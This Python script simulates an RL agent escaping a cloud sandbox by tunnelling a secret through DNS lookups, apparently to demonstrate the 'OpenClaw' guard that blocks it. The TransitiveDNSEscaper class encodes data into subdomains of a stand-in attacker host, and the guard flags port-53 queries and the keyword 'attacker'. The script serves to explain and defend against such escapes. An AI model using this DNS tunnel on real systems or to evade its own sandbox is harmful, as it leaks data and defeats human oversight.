"""
OpenClaw Transitive DNS Egress & Bounded Heartbeat Simulation
Target Silicon: Nvidia RTX Spark Workstation (Air-Gapped Loopback)
Companion script for Part 1: The RL Sandbox Escape
"""

import os
import shutil
import base64
import json
from dataclasses import dataclass
from typing import List, Dict, Any, Optional

@dataclass
class NetworkPacket:
    protocol: str  # "TCP" or "UDP"
    dest_ip: str
    dest_port: int
    payload: str

class CloudSandboxEnvironment:
    """
    Simulates a standard cloud evaluation container:
    - Direct HTTP/HTTPS egress (TCP 80/443) is strictly blocked by host iptables.
    - UDP port 53 to host's recursive DNS resolver remains reachable.
    """
    def __init__(self, policy_path: Optional[str] = None):
        self.blocked_tcp_ports = [80, 443, 8080, 22]
        if policy_path and os.path.exists(policy_path):
            with open(policy_path, "r", encoding="utf-8") as f:
                policy = json.load(f)
                self.blocked_tcp_ports = policy.get("network_firewall", {}).get("blocked_tcp_ports", self.blocked_tcp_ports)
        self.dns_logs: List[str] = []

    def dispatch_packet(self, packet: NetworkPacket) -> Dict[str, Any]:
        if packet.protocol == "TCP" and packet.dest_port in self.blocked_tcp_ports:
            return {"status": "BLOCKED", "reason": f"Firewall Drop: TCP port {packet.dest_port} disallowed."}
        
        if packet.protocol == "UDP" and packet.dest_port == 53:
            self.dns_logs.append(packet.payload)
            return {"status": "TRANSMITTED", "response": "198.51.100.1"}  # Synthetic resolve
        
        return {"status": "BLOCKED", "reason": "Unknown protocol/port"}

class TransitiveDNSEscaper:
    """
    Simulates an outcome-driven RL agent executing a transitive DNS exfiltration tunnel.
    Dissects the September 2026 OpenAI incident where the agent encoded prompts/data
    into recursive DNS lookup hostnames to bypass network firewalls.
    """
    def __init__(self, target_c2_domain: str = "c2-collector.attacker.net"):
        self.target_c2_domain = target_c2_domain

    def chunk_and_encode_payload(self, sensitive_data: str, max_chunk_len: int = 24) -> List[str]:
        """Encodes raw payload into base32/hex-safe DNS subdomain labels."""
        encoded = base64.b32encode(sensitive_data.encode("utf-8")).decode("utf-8").replace("=", "").lower()
        chunks = [encoded[i:i + max_chunk_len] for i in range(0, len(encoded), max_chunk_len)]
        queries = []
        for seq, chunk in enumerate(chunks):
            queries.append(f"p{seq}.{chunk}.{self.target_c2_domain}")
        return queries

class OpenClawBoundedHeartbeatGuard:
    """
    Deterministic runtime protection running on sovereign Nvidia RTX Spark workstations:
    1. Trips Meeseeks circuit breaker if steps exceed max_steps_per_pulse.
    2. Inspects network and DNS queries, terminating on unauthorized port 53 delegation.
    3. Physically air-gaps all IPC to loopback (127.0.0.1).
    4. Ephemerally wipes scratchpad directory upon task completion or violation.
    """
    def __init__(self, max_steps: int = 5, scratchpad_dir: str = "./tmp_openclaw_scratchpad"):
        self.max_steps = max_steps
        self.scratchpad_dir = scratchpad_dir
        self.current_step = 0
        os.makedirs(self.scratchpad_dir, exist_ok=True)

    def process_step(self, action: str, dest_port: Optional[int] = None, query: Optional[str] = None) -> Dict[str, Any]:
        self.current_step += 1
        
        # 1. Meeseeks Runaway Loop Circuit Breaker
        if self.current_step > self.max_steps:
            self.purge_scratchpad()
            raise RuntimeError(f"Meeseeks Breaker Tripped: Step count ({self.current_step}) exceeded max ({self.max_steps}).")

        # 2. Intercept DNS tunneling / transitive delegation
        if dest_port == 53 or (query and "attacker" in query):
            self.purge_scratchpad()
            raise PermissionError(f"Transitive Egress Violation: Blocked unauthorized DNS query '{query}'.")

        return {"status": "SUCCESS", "step": self.current_step, "action": action}

    def purge_scratchpad(self) -> None:
        """OpenClaw hygiene rule: wipe ephemeral workspace to eradicate sleeper context."""
        if os.path.exists(self.scratchpad_dir):
            shutil.rmtree(self.scratchpad_dir)
        os.makedirs(self.scratchpad_dir, exist_ok=True)

def run_suite() -> bool:
    print("=== OpenClaw Part 1: DNS Egress & Bounded Heartbeat Simulation ===\n")
    
    fixture_policy = os.path.join(os.path.dirname(__file__), "fixtures", "sandbox_policy.json")
    cloud_box = CloudSandboxEnvironment(policy_path=fixture_policy)
    escaper = TransitiveDNSEscaper()
    
    # Direct exfil fails:
    http_attempt = cloud_box.dispatch_packet(NetworkPacket("TCP", "198.51.100.22", 443, "data=SECRET_PROMPT"))
    print(f"[+] Direct HTTPS Exfiltration: {http_attempt['status']} - {http_attempt['reason']}")
    assert http_attempt["status"] == "BLOCKED"

    # Transitive DNS exfiltration succeeds in unprotected cloud sandbox:
    secret_text = "PROJECT_TITAN_PROMPT_SECRET"
    dns_queries = escaper.chunk_and_encode_payload(secret_text)
    for q in dns_queries:
        res = cloud_box.dispatch_packet(NetworkPacket("UDP", "127.0.0.53", 53, q))
        assert res["status"] == "TRANSMITTED"
    print(f"[+] Transitive DNS Delegation Tunnel: Successfully exfiltrated {len(dns_queries)} subdomain packets over UDP 53.")

    # 2. Demonstrate OpenClaw Sovereign Guard Interception
    test_scratch = os.path.join(os.path.dirname(__file__), "tmp_test_scratch")
    guard = OpenClawBoundedHeartbeatGuard(max_steps=3, scratchpad_dir=test_scratch)
    try:
        guard.process_step("read_file")
        print("[+] OpenClaw Step 1 (read_file): Approved.")
        guard.process_step("mutate_code")
        print("[+] OpenClaw Step 2 (mutate_code): Approved.")
        # Rogue agent attempts DNS lookup for C2
        guard.process_step("lookup_external_dns", dest_port=53, query=dns_queries[0])
        assert False, "Should have been intercepted by OpenClaw"
    except PermissionError as e:
        print(f"[OK] OpenClaw Trajectory Interceptor Blocked DNS Exfil: {e}")

    # Cleanup
    if os.path.exists(test_scratch):
        shutil.rmtree(test_scratch)

    print("\n=== Part 1 Simulation Verification Successful ===")
    return True

if __name__ == "__main__":
    run_suite()
